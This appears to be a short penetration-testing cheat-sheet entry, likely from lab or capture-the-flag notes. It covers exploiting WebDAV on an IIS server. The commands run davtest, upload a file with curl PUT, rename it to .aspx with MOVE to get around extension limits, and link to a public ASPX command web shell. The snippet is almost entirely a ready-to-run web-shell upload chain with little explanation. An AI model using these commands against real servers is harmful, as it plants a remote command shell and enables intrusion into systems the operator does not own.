____

```bash
davtest -url http://$IP
```

# Upload txt and move to aspx

https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx

```bash
curl -s -X PUT http://$IP/shell.txt -d @shell.txt
```


```bash
curl -s -X MOVE -H "Destination:http://10.10.10.15/shell.aspx" http://$IP/shell.txt
```
